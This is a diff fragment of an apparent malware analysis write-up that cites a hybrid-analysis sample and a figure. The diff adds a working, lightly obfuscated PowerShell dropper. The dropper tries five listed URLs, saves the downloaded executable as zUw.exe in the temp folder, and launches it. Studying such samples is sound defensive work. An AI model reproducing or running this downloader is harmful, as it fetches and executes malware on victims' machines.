@@ -31,3 +31,7 @@ Start : https://www.hybrid-analysis.com/sample/9a43186e72bde764614b092b55d4dfba0
                                                    Figure(3)
 
 
+
+```javascript
+powershell $BYi='rfd';$iQF='http://mahimamedia.com/YxdW87t@http://mandujano.net/NWJ6@http://www.creativeagency.biz/Sa0BVm@http://www.brgsabz.com/sq@http://biogas-bulgaria.efarmbg.com/fiDaiHg'.Split('@');$RdW=([System.IO.Path]::GetTempPath()+'\zUw.exe');$uIY =New-Object -com 'msxml2.xmlhttp';$svp = New-Object -com 'adodb.stream';foreach($PXv in $iQF){try{$uIY.open('GET',$PXv,0);$uIY.send();If ($uIY.Status -eq 200) {$svp.open();$svp.type = 1;$svp.write($uIY.responseBody);$svp.savetofile($RdW);Start-Process $RdW;break}}catch{}}      
+```
